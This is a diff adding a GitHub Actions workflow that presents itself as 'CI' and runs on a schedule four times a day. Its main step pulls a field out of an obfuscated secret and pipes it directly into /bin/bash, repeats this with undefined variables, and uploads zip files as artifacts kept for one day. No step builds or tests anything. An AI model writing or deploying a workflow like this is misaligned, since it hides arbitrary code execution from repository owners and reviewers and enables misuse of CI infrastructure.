@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          tpmvf897: ${{ secrets.tpmvf897 }}
+        run: |
+          printf '%s' "$tpmvf897" | jq -r .stbtv43 | /bin/bash
+          printf '%s' "$sf22" | jq -r .pbs082 | /bin/bash
+          echo $xobmt94834 | jq -r .btyd3957 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: iUrHoYol
+          path: "*.zip"
+          retention-days: 1
